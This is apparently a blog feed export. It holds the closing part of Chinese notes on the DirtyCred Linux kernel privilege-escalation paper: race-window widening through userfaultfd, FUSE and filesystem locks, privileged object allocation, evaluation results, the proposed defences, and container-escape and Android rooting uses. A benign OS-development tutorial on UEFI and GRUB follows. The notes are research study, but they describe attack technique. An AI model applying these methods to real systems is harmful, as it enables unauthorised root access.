id="5-2-Alternative-Exploitation-of-Userfaultfd-FUSE"><a href="#5-2-Alternative-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.2 Alternative Exploitation of Userfaultfd &amp; FUSE"></a>5.2 Alternative Exploitation of Userfaultfd &amp; FUSE</h2><p>如 List 2 所示，在内核版本 4.13 之后导入 <code>iovec</code> 向量的步骤被移动到了权限检查之前，这使得我们不再能扩大权限检查与文件写入间的时间窗口，为了解决这个问题，DirtyCred 将利用 Linux 文件系统的设计</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164938.png"></p><p>内核文件系统的设计遵循严格的层次关系，高层接口统一而低层接口各异，写入文件时会调用高层接口，如 List 3 所示， <code>generic_perform_write()</code> 为统一的高层接口，在第 15 ~ 17 行其会调用对应文件系统的写入操作，出于性能考虑内核在写入前会拷贝 iovec 向量数据，从而触发缺页异常，由此 DirtyCred 可以在第 10 行使用 userfaultfd 来延长时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230201446.png"></p><p>与通过导入 <code>iovec</code> 来暂停内核的执行相比，对文件系统的设计进行利用则更难被缓解，如 List 3 中注释所言，移除 iovec 的 page fault 有可能造成死锁；将 page fault 移到权限检查前可能解决问题，但这会对性能造成影响，且仍存在潜在的被绕过的可能，如 DirtyCred 可以在 paeg fault 之后再移除该页，从而在拷贝时再次 page fault 以暂停（<del>有点扯了</del>）</p><h2 id="5-3-Exploitation-of-Lock-in-Filesystem"><a href="#5-3-Exploitation-of-Lock-in-Filesystem" class="headerlink" title="5.3 Exploitation of Lock in Filesystem"></a>5.3 Exploitation of Lock in Filesystem</h2><p>Linux 文件系统存在锁机制（如 List 4 为 ext4 中的锁），这为 DirtyCred 创造了机会，我们可以创建两个进程 A 与 B 同时写入同一文件，在 A 持有锁进行写入时 B 陷入等待，而在 <code>generic_perform_write()</code> 之前权限检查早已完成，由此 DirtyCred 可以通过写入大量数据来创造一个较长的时间窗口以完成 file 的替换（据作者观察写入 4GB 文件大概需要好几秒）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230203419.png"></p><h1 id="0x06-Allocating-Privileged-Object"><a href="#0x06-Allocating-Privileged-Object" class="headerlink" title="0x06. Allocating Privileged Object"></a>0x06. Allocating Privileged Object</h1><p>DirtyCred 需要在内核空间分配特权对象，本节叙述如何以一个低权限用户做到这一点</p><h2 id="6-1-Allocation-from-Userspace"><a href="#6-1-Allocation-from-Userspace" class="headerlink" title="6.1 Allocation from Userspace"></a>6.1 Allocation from Userspace</h2><p><code>cred</code> 对象代表了对应内核进程的权限，因此 DirtyCred 可以通过执行 root-SUID 程序来创建 root 进程（而不用寻找这类程序中的漏洞），这样的程序包括 sudo、pkexec 等</p><p>DirtyCred 除了替换 <code>cred</code> 对象以外也可以通过替换 <code>file</code> 对象来提权，不过 <code>file</code> 对象的分配远比 <code>cred</code> 容易，以对应权限打开文件即可</p><h2 id="6-2-Allocation-from-Kernel-Space"><a href="#6-2-Allocation-from-Kernel-Space" class="headerlink" title="6.2  Allocation from Kernel Space"></a>6.2  Allocation from Kernel Space</h2><p>除了从用户空间分配特权对象以外，DirtyCred 也可以从内核空间分配特权对象，如生成新的特权内核线程完成特权凭证对象的分配，主要有两种方式：</p><ul><li>调用内核代码触发内核在内部生成特权线程，如通过向 <a href="https://docs.kernel.org/core-api/workqueue.html">工作队列</a> 提交任务让内核创建新的工作者线程</li><li>唤醒 usermode helper，如通过加载内核模块来让内核启动特权用户态 usermode helper 程序（如 modprobe）</li></ul><h1 id="0x07-Evaluation"><a href="#0x07-Evaluation" class="headerlink" title="0x07. Evaluation"></a>0x07. Evaluation</h1><p>作者设计了两个实验来在真实世界漏洞上评估 DirtyCred</p><h2 id="7-1-Experiment-Design-Setup"><a href="#7-1-Experiment-Design-Setup" class="headerlink" title="7.1 Experiment Design &amp; Setup"></a>7.1 Experiment Design &amp; Setup</h2><p>作者引入了一种自动化方法（设计实现参见附录 A）寻找可供 DirtyCred 利用的内核对象，并应用于 5.16.15 版本的内核</p><p>作者还探讨了针对实际漏洞利用的可行性，如第 4 节所言，若漏洞未直接提供交换凭证结构体的能力，则需要我们进行转换</p><p>作者假设 Linux 内核使用其最先进的防护手段，并在评估中仅选择 2019 年以后的 CVE，数据集如表 2 所示，这涵盖了几乎所有的堆上漏洞类型</p><h2 id="7-2-Experiment-Result"><a href="#7-2-Experiment-Result" class="headerlink" title="7.2 Experiment Result"></a>7.2 Experiment Result</h2><p><strong>可利用对象</strong>。表 1 展示了不同缓存池中可以被利用的内核对象，几乎所有通用缓存池（除了 <code>kmalloc-8</code> ）都有可供 DirtyCred 利用对象：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230204803.png"></p><p><strong>可利用性</strong>。表 2 显示了 DirtyCred 在不同漏洞上的可利用性，在开启所有防护的情况下其在 24 个漏洞中的 16 个上都完成了利用，这表明了其通用性与强大</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230205513.png"></p><blockquote><p>还有一些关于利用失败的阐述，这里笔者就不抄了</p></blockquote><h1 id="0x08-Defence-Against-DirtyCred"><a href="#0x08-Defence-Against-DirtyCred" class="headerlink" title="0x08. Defence Against DirtyCred"></a>0x08. Defence Against DirtyCred</h1><p>现有各种防护主要针对控制流劫持，难以对抗 DirtyCred，作者认为一种有效的对抗方式是隔离高权限与低权限对象，比较直接的想法是创建不同的缓存池，但这仍能通过跨缓存的页回收完成利用</p><p>基于上述考虑，作者设计的解决方案是为高权限对象在虚拟内存区域创建一个缓存（创建的凭证对象 ID 为 <code>GLOBAL_ROOT_UID</code> 时或以写权限打开文件时则使用 vmalloc 分配），同时低权限对象保留在正常内存区域，从而隔离开内存页；但运行时权限更改（如 setuid 系统调用）仍能破坏这种机制，作者的解决方案是为更改操作添加检查，若是改为 <code>GLOBAL_ROOT_UID</code> 则将高权限凭证对象复制到 vmalloc 区域而非更改原始对象，但这需要未来的内核开发遵循相同的模式，因此作者仍在探索替代解决方案</p><p>性能评估结果如表 3 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230210827.png"></p><p>在这项工作中，作者称其主要目标是提高Linux社区的意识，而不是构建一个安全、高效的防御解决方案，且作者将探索替代防御解决方案作为未来研究的一部分</p><h1 id="0x09-Related-Work"><a href="#0x09-Related-Work" class="headerlink" title="0x09. Related Work"></a>0x09. Related Work</h1><p>这一节主要介绍与论文相关的两方面工作——内核利用（exploitation）与内核防护（defence），都是常识性内容所以这里笔者就不摘抄了：）</p><h1 id="0x10-Discussion-Future-Work"><a href="#0x10-Discussion-Future-Work" class="headerlink" title="0x10. Discussion &amp; Future Work"></a>0x10. Discussion &amp; Future Work</h1><p>这节讨论之前没提到的一些点：</p><ul><li><p><strong>Escaping container.</strong> 容器中的文件并不提供交换命名空间的能力，但<a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">一项最近的研究</a>显示攻击者可以被动等待 runC 进程，由此可以通过覆写进程来在 host 侧以 root 运行命令，DirtyCred 可以以此完成容器逃逸；利用 cred 对象则不需要被动等待，通过交换 cred 获得 <code>SYS_ADMIN</code> 权限使得攻击者可以挂载 cgroup 后利用 <code>notify_no_release</code> 机制来在 host 侧以 root 执行命令，作者在<a href="https://hackmd.io/giRE2P2oQHektZzOG053IQ">这里</a>给出了案例</p></li><li><p><strong>Rooting Android.</strong> 安卓也是 Linux 内核，DirtyCred 可以通过文中讨论的两种方式完成安卓提权，不过实战中安卓内核有着更严格的访问限制，直接交换 cred 是可行的，对于文件而言可以首先覆写共享库以完成沙箱逃逸，之后再覆写内核模块，作者在 0day 漏洞上用 DirtyCred 完成了利用并获得更Google 的致谢</p></li><li><p><strong>Cross version&#x2F;architecture exploitation.</strong> DirtyCred 的利用是跨版本跨架构的，因为其基本不需要内核信息，也不需要特定于架构的数据</p></li><li><p><strong>Other way to pivot capability.</strong> 虚拟内存区上的漏洞更难被转化为 DirtyCred，但不意味着无法使用 DirtyCred，如<a href="https://github.com/HexRabbit/CVE-writeup/tree/master/CVE-2021-34866">这个工作</a>将 vmalloc 区上的越界写漏洞 CVE-2021-34866 转为任意内存读写</p></li><li><p><strong>Stability.</strong> 稳定性主要受内存布局与漏洞触发方式影响，<a href="https://www.usenix.org/conference/usenixsecurity22/presentation/zeng">最近的一个工作</a>提出了一系列方法提高利用稳定性</p></li><li><p><strong>TOCTOU.</strong> （Time-Of-Check to Time-of-Use） DirtyCred 在关键时间窗口交换凭证对象，直觉告诉我们现有的 TOCTOU 防御方法可能会阻碍 DirtyCred，但针对<a href="https://ieeexplore.ieee.org/document/9718065/">最近一篇关于 TOCTOU 的研究文章</a>分析，实际上并不会，因为 DirtyCred 使用了意外的释放操作，而这在各种分析过程中不可见</p></li></ul><h1 id="0x11-Conclusion"><a href="#0x11-Conclusion" class="headerlink" title="0x11. Conclusion"></a>0x11. Conclusion</h1><p>作者开发了 Linux 内核通用利用手法 DirtyCred，很好很强大，撒花~🌸🌸🌸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新瓶装旧酒的 114514 种写法&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x05】过量电波重度依赖：再别电专</title>
    <link href="https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/"/>
    <id>https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/</id>
    <published>2023-12-20T19:30:41.000Z</published>
    <updated>2023-12-30T10:45:56.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！但是题目还没出好所以暂且请等待..." data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="4de51144639fa16a8ecbdfa6582d90c8d1f285c11113223e663031ab4ef51287"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">题目还没出好所以暂且请等待</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">为什么要让我忘记呢 我们以前感情明明那么好 大家每天在一起都很开心 结果现在各奔东西什么的这太奇怪了 你不是说乐团是命运共同体吗 求求你 我想让crychic重新开始 我想找回大家那段快乐的日子 crychic没有结束 我一直为了它在努力着 等一下 不要走 我真的很喜欢大家很重视大家 求求你 ‍♀️要我怎么做你们才肯回来 ‍♀️只要是我能做的我什么都愿意做 ‍♀️我真的</summary>
    
    
    
    <category term="PIECES" scheme="https://arttnba3.github.io/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="https://arttnba3.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x03】现代 64 位 OS 开发手记 I：Cmake构建、UEFI 启动、GRUB 引导、Frame buffer 文字输出</title>
    <link href="https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/"/>
    <id>https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/</id>
    <published>2023-11-29T12:21:47.000Z</published>
    <updated>2024-06-19T03:55:56.968Z</updated>
    
    <content type="html"><![CDATA[<p>遥遥领先！遥遥领先！遥遥领先！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>很久以前在知乎上曾经有过一个“程序员的三大浪漫”的讲法：「编译原理」、「操作系统」、「图形学」——当然这个似乎是某些知名答主杜撰的并没有任何的由头神必说法，笔者自己也不认为所谓的“程序员的浪漫”就仅是这几个东西，但对于笔者而言，“自己动手编写一个可以正常运行的操作系统”确乎是一件<strong>非常炫酷的事情</strong></p><p>笔者此前在大二下学期的时候曾参照《操作系统真象还原》编写过一个非常简陋的只有打印功能的 32 位操作系统——严格来说笔者仅仅完成了一个高度客制化的 boot loader 加上一点点的 kernel（因为懒而不是时间不够，天天摆烂躺平打游戏😥），也没有在真机上测试过，完全算不上一个能用的操作系统；在大三寒假期间笔者花了将近一周的时间<a href="https://arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/">刷完了 MIT 6.828 的前四个 lab</a>，但那严格意义上来说也并不是笔者从零开始写的一个内核——大框架基本都是 MIT 搭好的，笔者仅仅只用补足非常微小的一部分；在大三下学期笔者想与曾经喜欢过的妹子一起参加一个<a href="https://os.educg.net/">写操作系统内核的比赛</a>，但是由于<a href="https://arttnba3.cn/2022/10/28/PIECES-0X04-SHELL_OUTSIDE-4-XIANG_WAN/">一些缘故</a>笔者一直拖到了比赛结束都还没有开始动手写第一行代码，最后也就不了了之了；在大四上学期笔者又重新写了一个<a href="https://github.com/arttnba3/SumiOS">用 Grub2 引导的 64 位内核</a>，但是写完内存分配之后也烂尾了 😅</p><blockquote><p>仔细想来对于笔者来说似乎很少存在“万事开头难”的阶段，但往往一切事物都会滑向无底的大坑永久无法填上：）</p></blockquote><p>因此趁着现在时间尚且充足，笔者想要<strong>真正地从零写一个可用的 64 位操作系统内核</strong>，算是满足自己多年来的一个梦想吧，名字的话笔者决定叫 <code>ClosureOS</code> ——这个名字的由来比较简单，笔者一直很难想出比较好听的名字，看了看市面上有各种操作系统都叫 <code>Open*</code> ，那笔者就叫 <code>Close</code> 好了，但是 <code>Close</code> 这个单词长得又不好看，于是笔者最终选择了 <code>Closure</code> 作为这个操作系统的名字——虽然似乎不是特别好听，但反正是否能写完都还是个未知数，所以也无所谓了（笑）</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><h1 id="0x01-Boot-Firmware"><a href="#0x01-Boot-Firmware" class="headerlink" title="0x01. Boot Firmware"></a>0x01. Boot Firmware</h1><p>现代计算机的上电过程比较复杂，不过对于操作系统开发而言我们其实只需要关注<strong>当我们按下开机键之后所发生的事情</strong>，实际上无论是古老的 Legacy BIOS 启动还是逐渐成为主流的 UEFI 启动而言，其不外乎都遵循以下三个大阶段：</p><ul><li><strong>ROM Stage</strong>：经历了一些基本的初始化工作后 CPU 被重置，主核心被唤醒，指令指针寄存器指向 <code>reset vector</code>（固件入口点）并由此开始执行，此时尚未进行内存探测，需要直接在 ROM 上执行</li><li><strong>RAM Stage</strong>：内存探测完成，此时可以进行主板上各芯片组、CPU 等模块的初始化等工作</li><li><strong>Boot Stage</strong>：找到启动设备，完成启动设备前的依赖项的准备，将控制权移交给设备上的下一阶段的启动器</li></ul><p>现有的固件通常分为两类：BIOS 与 UEFI</p><h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><p><strong>基本输入输出系统</strong>（<strong>Basic Input&#x2F;Output System</strong>，BIOS）是用来为计算机提供初始化服务与运行时服务的一组固件，其被预装在主板的 ROM&#x2F;FLASH 芯片上，不同的 BIOS 通常仅能在特定的主板型号上运行</p><p>当计算机启动后 BIOS 为第一个被运行的软件，此时计算机处于实模式下，仅能访问 1MB 内存的空间，其中物理内存 <code>0xF0000 ~ 0xFFFFF</code> 这 64KB 空间被映射到 BIOS ROM 当中，并以 <code>0xFFFF0</code> 处作为 BIOS 程序的入口点开始执行</p><blockquote><p>对于支持且开启了 BIOS shadowing 特性的计算机而言，BIOS 会被先从固件当中拷贝到内存中，而非直接在 ROM 空间上执行</p></blockquote><p>BIOS 会从南桥的 CMOS 芯片中读取 BIOS 程序的设置值、硬件参数侦测值等信息，在完成加电自检、设备测试等工作之后，会从启动设备中读取第一个扇区到物理内存 <code>0x7c00</code> 的位置，该扇区被称为<strong>主引导记录</strong>（<strong>Master Boot Recode</strong>，MBR），随后 BIOS 会跳转到 <code>0x7c00</code> 处继续执行，控制权转交给 MBR</p><p>MBR 的结构如下图所示，其中<strong>不仅包含有 440 字节的第一阶段引导代码，同时还包含有磁盘的分区表信息</strong>，MBR 以末尾的两个字符 <code>0x55, 0xaa</code> 作为其标识：</p><blockquote><p>这里我们可以看到 MBR 分区表仅支持不超过四个主分区，多余的分区则需要依赖操作系统在其上建立虚拟分区，此外 MBR 也不支持管理硬盘 2TB 以外的存储空间，因此这种分区方式 <em>其实已经正在逐渐地被淘汰</em> </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113212038.png"></p><p>由于 MBR 仅有 512 字节，无法完成过多的任务，因此通常的设计是由 MBR 从硬盘上读取第二阶段的 boot loader，由其来完成后续的系统环境初始化、载入操作系统内核等工作</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113211739.png"></p><h2 id="Unified-Extensible-Firmware-Interface"><a href="#Unified-Extensible-Firmware-Interface" class="headerlink" title="Unified Extensible Firmware Interface"></a>Unified Extensible Firmware Interface</h2><p><strong>统一可扩展固件接口</strong>（<strong>Unified Extensible Firmware Interface</strong>，UEFI）为一套<strong>固件接口规范，用以初始化硬件、引导操作系统，并向操作系统提供一套统一的功能接口，解决不同厂牌 BIOS 分裂的现状</strong>，其最初起源于 Intel 开发的 EFI，在 2005 年由 Intel 交由 UEFI 论坛进行推广，<strong>UEFI 固件本质上与 BIOS 固件没有区别</strong>（都是封装在 ROM&#x2F;FLASH 固件里的程序）</p><blockquote><p>例如 BIOS 厂商 A 提供的某个功能接口的使用方式是 X，BIOS 厂商 B 提供的相似功能接口使用方式是 Y，那操作系统就得为不同厂商的不同功能编写多套代码</p><p>而有了 UEFI 规范，厂商 A、B 的 UEFI 固件都需要向上层提供统一的接口，从而使得操作系统可以用相同的方式调用某个功能，避免了代码分裂的情况</p></blockquote><p>这里引用一张非常经典的图片简述 UEFI 启动的基本过程：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113191232.png"></p><p>相应地，UEFI 启动不再使用老旧的 MBR 分区表，而是使用 <strong>GUID Partion Table</strong> （GPT 分区表），以 512 字节为单位作为一个<strong>逻辑块</strong>（Logic Block，相对应的区块地址便称为 LBA），前 34 个 LBA 用来记录分区信息，其中 LBA0 为了兼容性保留给 MBR 使用，LBA1 记录分区表自身的信息、备份用 GPT 分区（最后 34 个 LBA 的位置）、分区的 CRC 校验码等，LBA2 ~ LBA 33 则用来记录分区信息，每个 LBA 可以记录四个条目：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129220808.png"></p><blockquote><h4 id="扩展阅读：兼容支持模块（Compatibility-Support-Module）"><a href="#扩展阅读：兼容支持模块（Compatibility-Support-Module）" class="headerlink" title="扩展阅读：兼容支持模块（Compatibility Support Module）"></a>扩展阅读：兼容支持模块（Compatibility Support Module）</h4><p>在 UEFI 逐渐替换掉计算机底层固件的风潮涌动之时，尚有大量的设备仍旧使用传统的 MBR 分区表，为了进行兼容，CSM 这一兼容支持模块会模拟传统 BIOS 的功能，为这些设备系统按照传统的 BIOS + MBR 方式进行引导，并提供传统 BIOS 的 0x10 等中断服务</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129203153.png"></p></blockquote><h2 id="Coreboot"><a href="#Coreboot" class="headerlink" title="Coreboot"></a><em>Coreboot</em></h2><p><strong>Coreboot</strong> 起源于 <strong>LinuxBIOS</strong>，最初的思路是 <em>既然 Linux 有比较好的硬件支持，那计算机启动以后直接跳 Linux就完事了</em>  ， 于是 <em>使用 20 行汇编完成初始化并将 Flash 中的 Linux 拷贝至内存后直接跳过去</em> 的 LinuxBIOS 诞生于 1999年，随后经过不断发展，引导 Linux 所用的程序越来越大，于是项目在 2008 年改名为 coreboot，项目结构变为 <code>coreboot + payload</code>，Linux 则成为了 <em>可选的一段 payload</em> ，通过这样的模式，Coreboot 可以通过引入不同的 payload 来支持多种不同的启动规范，包括 Legacy BIOS 和 UEFI</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129222934.png"></p><blockquote><p>目前市面上正在使用 Coreboot 的主流产品有 Google Chromebook 和 System76 旗下的笔记本等</p></blockquote><h1 id="0x02-多重引导规范-GNU-GRUB"><a href="#0x02-多重引导规范-GNU-GRUB" class="headerlink" title="0x02. 多重引导规范 &amp; GNU GRUB"></a>0x02. 多重引导规范 &amp; GNU GRUB</h1><h2 id="Why-GRUB？"><a href="#Why-GRUB？" class="headerlink" title="Why GRUB？"></a>Why GRUB？</h2><p>现今的大部分所谓“教你自行编写操作系统”的无论是教程也好书籍也好，都存在着一个小小的问题：<strong>对 Legacy BIOS 的内核引导阶段大书特书</strong>——诚然，了解一台计算机从启动开始到内核真正运作这段期间的实现细节无疑是十分重要的一件事情，对于操作系统学习而言或许也有不小的帮助，但很容易让初学者陷入到与各种硬件博弈的苦战当中，同时对于实际的开发而言手动编写一个<strong>仅适用于我们自己的内核</strong>的客制化 <code>MBR + boot loader</code> 意义并不算特别大</p><blockquote><p> <del>再说都什么时代了还在用 Legacy BIOS，Wintel 联盟都宣布这玩意已经彻底成为历史了，👴🚪就没有必要再深究了，大概了解一下差不多得了</del></p></blockquote><p>而 UEFI 规范虽然给了我们更为方便地通过 UEFI 的各种接口实现不同的功能，但<strong>UEFI 的大部分功能在 Runtime 阶段是不可用的</strong>，同时这也少不了编写设备识别、文件系统解析等工作，再配上编写各种基础设施，一套写下来一个EFI 程序其实差不多就已经是一个完整的小内核了——当然， <em>直接用 EFI 程序作为操作系统内核不是不行，看着也确实像个样子</em> ，<strong>就是不太优雅，也不太现代</strong></p><p>因此，对于内核引导阶段，我们暂时选择<strong>直接复用现有的成熟的方案</strong>——例如「GNU GRUB」，其同时支持 Legacy BIOS 与 UEFI 引导，让我们不用在一开始就陷入到与各种存储设备斗争的泥潭当中</p><p><img src="https://s2.loli.net/2022/09/07/eTCVOtlpE7PYFXq.png" alt="image.png"></p><blockquote><p>当然，如果说仅从「学习」的角度而言自己亲手写一个 <code>MBR + boot loader</code> &#x2F; <code>EFI</code> 并亲身体会到其载入内核的整个过程其实是一件非常有益处的事情（笑）</p><blockquote><p>先挖个坑：我们将在操作系统内核开发完成之后的后续补充文章中<strong>自行开发一个 EFI 程序以引导符合 multiboot2 规范的内核</strong></p></blockquote></blockquote><blockquote><p>也有人会问：那为什么不用 <a href="https://github.com/limine-bootloader/limine">Limine</a> 或是 <a href="https://gitlab.com/bztsrc/bootboot">BOOTBOOT</a> 这样更加现代的 boot loader 呢？一个原因就是因为 GRUB 相对有着更好的兼容性，能够在更多设备上运行，教程资料也比较多</p></blockquote><h2 id="Multiboot2-规范"><a href="#Multiboot2-规范" class="headerlink" title="Multiboot2 规范"></a>Multiboot2 规范</h2><p>那么我们如何让 GNU GRUB 知道他该怎么引导一个什么样的内核呢？答案是通过<a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">多重引导规范</a>（Multiboot Specification），该规范制定的目的是使得遵循该规范的操作系统可以被同样遵循该规范的 boot loader 引导，而无需编写特定于 OS 的 boot loader</p><p>GNU GRUB 第二版进行了完全的重写，多重引导规范也有个<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">第二版</a>，不过好在 GRUB2 同时支持两版引导规范——这里我们使用<strong>第二版</strong>的规范</p><blockquote><p>然而 Linux kernel 使用的<strong>并不是 multiboot  规范</strong>，而是其<a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">自定义的协议</a></p></blockquote><p>多重引导规范要求我们的内核映像的前 <code>32768</code> 字节中一个任意的 <strong>64位对齐的位置</strong> 必须要有一个 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-layout"><code>multiboot2 header</code></a> 来记录相应的信息，格式如下：</p><table><thead><tr><th>Offset</th><th>Type</th><th>Field Name</th><th>Note</th></tr></thead><tbody><tr><td>0</td><td>u32</td><td>magic</td><td>required</td></tr><tr><td>4</td><td>u32</td><td>architecture</td><td>required</td></tr><tr><td>8</td><td>u32</td><td>header_length</td><td>required</td></tr><tr><td>12</td><td>u32</td><td>checksum</td><td>required</td></tr><tr><td>16-XX</td><td></td><td>tags</td><td>required</td></tr></tbody></table><ul><li><p><code>magic</code>：multiboot2 header 的标识，必须为 <code>0xE85250D6</code></p></li><li><p><code>architecture</code>：标识指令集架构，0 表示 32 位 i386 保护模式，4 表示 32 位 MIPS</p></li><li><p><code>header_length</code> ：包含 tags 在内的整个 multiboot2 header 的大小</p></li><li><p><code>checksum</code>：该域与前三个域相加的和为无符号 0</p></li><li><p><code>tags</code>：补充域，其格式通常如下，以类似数组的形式跟在后边，<strong>每个 tag 的起始地址8 字节对齐</strong>，<strong>整个 tag 数组以一个 type 为 0 及 size 为 8 的 tag 结尾</strong>，关于不同类型的 tag 格式，参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-tags">此处</a>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u16     |<span class="hljs-string"> type              </span>|<br>u16     |<span class="hljs-string"> flags             </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure></li></ul><h2 id="在-U-盘上安装-GRUB2"><a href="#在-U-盘上安装-GRUB2" class="headerlink" title="在 U 盘上安装 GRUB2"></a>在 U 盘上安装 GRUB2</h2><p>虽然很多操作系统编写教程都是在虚拟机当中运行的，毕竟 <em>对于操作系统初学者而言更重要的是了解整个操作系统的运行机理</em> ，但是<strong>在物理机上运行自己写的操作系统是非常令人感到愉悦的一件事情</strong>，所以这里我们将会介绍如何在 U 盘上安装 GRUB 来引导自己的操作系统内核</p><blockquote><p>如果你不想弄这一部分，也可以跳转到下一节，直接开始安全地使用 QEMU，我们后面的各种开发调试其实主要也是在 QEMU 上完成的 ：）</p></blockquote><ul><li><p>如果你在物理机上使用 Linux 作业系统，请找到你的 U 盘对应的设备节点，通常情况下，如果你的计算机<strong>仅</strong>使用 <code>nvme m.2</code> 固态硬盘，则新插入的 U 盘 <em>通常</em> 是 <code>/dev/sda</code> ，<strong>如果你则计算机仍在使用 SATA 接口的硬盘，请注意自行确定设备路径</strong></p></li><li><p>如果你在物理机上使用 Windows 操作系统，出于易用性考虑我们并不使用 WSL，<strong>而是在 Vmware 虚拟机中安装一个 Linux 操作系统</strong>，并通过如下方式将 U 盘连接到虚拟机中（请先确定好你的 U 盘对应的设备名称），在你的虚拟机处在默认配置且不存在外部存储设备的情况下，U 盘对应的设备节点通常是 <code>/dev/sdb</code>：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214055.png"></p><blockquote><p> 也可以通过<strong>物理重新拔插可移动设备</strong>以让 Vmware 自行截获：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214205.png"></p><p>如果你是其他情况，请自行进行判断 ：)</p></blockquote><p>首先安装一些你可能会需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y dosfstools mtools gparted gcc cmake git bison libopts25 libselinux1-dev m4 help2man libopts25-dev flex libfont-freetype-perl automake make autotools-dev autopoint libfreetype6-dev texinfo python3 autogen autoconf libtool libfuse3-3 unifont gettext binutils pkg-config liblzma5 libdevmapper-dev</span><br></code></pre></td></tr></table></figure><p>接下来我们对 U 盘进行分区，<strong>请确保你已经将所有重要数据完成备份</strong>，这里笔者选择使用 <code>GParted</code> 进行分区，我们首先通过 <code>Device→Create Partion Table...</code> 建立一个 GPT 分区表：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214927.png"></p><blockquote><p>此时可能会提示无法重建分区表，这是因为操作系统可能偷偷帮你把分区挂载在 <code>/run/你的用户名</code> ，请使用 <code>umount</code> 卸载所有活动分区，之后重新启动 <code>GParted</code></p></blockquote><p>然后右键新建分区，这里笔者选择建立一个大小为 512MB 的 EFI 分区，注意<strong>该分区必须为 fat32 格式</strong>，剩余的空间作为一个文件系统分区， <em>我们将在后续开发文件系统时用到它</em> ，划分好后点绿色的✅然后 <code>Apply</code>：</p><blockquote><p>这里 GParted 会在 U 盘末尾留下 1MB 的空间，用来放 MBR 分区表，主要是出于兼容目的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127160626.png"></p><p>接下来我们从源码编译 